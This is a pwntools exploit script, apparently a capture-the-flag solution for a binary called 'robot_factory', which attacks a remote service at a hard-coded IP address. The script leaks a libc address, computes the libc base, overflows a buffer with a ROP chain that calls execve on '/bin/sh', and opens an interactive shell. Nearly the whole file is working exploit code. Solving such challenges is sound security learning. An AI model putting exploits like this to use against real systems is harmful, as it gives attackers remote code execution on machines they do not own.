from pwn import *

#target = process('./robot_factory', env={"LD_PRELOAD":"./libc.so.6"})

#pid = gdb.attach(target, "b *create_robot+145\nb *do_string+138\nb *multiply_func+124\nb *do_robot\nb *start_thread+213\n set disassembly-flavor intel\ncontinue")


libc = ELF('libc.so.6')
elf = ELF('robot_factory')

target = remote('64.227.38.214', 30031)

#Getting libc leak:

print(target.recvuntil(b'>'))
target.sendline(b'n')

print(target.recvuntil(b'>'))
target.sendline(b'a')

print(target.recvuntil(b'1:'))
target.sendline(b'2')

print(target.recvuntil(b'2:'))
target.sendline(b'2')

print(target.recvuntil(b'Result: '))

result = target.recvuntil(b'\n').strip()
print(result)

leak = int(result)

puts_libc = leak + 0x8af6d8
libc_base = puts_libc - libc.symbols['puts']


#print(target.recvuntil(b'>'))
target.sendline(b's')

print(target.recvuntil(b'>'))
target.sendline(b'm')

print(target.recvuntil(b'1:'))

binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

pop_rdi = p64(0x0000000000401ad3) # : pop rdi ; ret
pop_rsi = p64(libc_base + 0x0000000000027529) # : pop rsi ; ret
pop_rdx_r12 = p64(libc_base + 0x000000000011c371) # : pop rdx ; pop r12 ; ret
execve = libc_base + libc.symbols['execve']
printf_libc = libc_base + libc.symbols['printf']
puts_libc = libc_base + libc.symbols['puts']
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']

#My libcs are off, but the ROPchain basically works
ropchain = b'e' * 8 + pop_rdi + p64(binsh) + pop_rsi + p64(0) + pop_rdx_r12 + p64(0) * 2 + p64(execve)
#I used this alternate ropchain:
#ropchain = b'e' * 8 + pop_rdi + p64(puts_got) + p64(puts_plt)
ropchain += b'f' * (0x78 - len(ropchain))

payload = b'c' * 0x28 + b'a' * 8 + ropchain + b'a' * 8 + b'b' * 0x30
print('This needs to be 0xe0', hex(len(payload)))

target.sendline(payload)
print(target.recvuntil(b'size:'))

target.sendline(b'10')
#target.interactive()

#And this stuff down here to get the remote offset for my libc leak. This way I didn't have to deal with looping back to main.
'''
print(target.recvuntil(b'(n/s) > '))
new_leak = target.recv(6)
print(new_leak)
puts_libc = u64(new_leak + b'\x00' * 2)
print(hex(puts_libc))

print('as a reminder, the leak is at', hex(leak))
print('to get puts_libc, I need to add', hex(puts_libc - leak), 'to my leak')
'''
target.interactive()
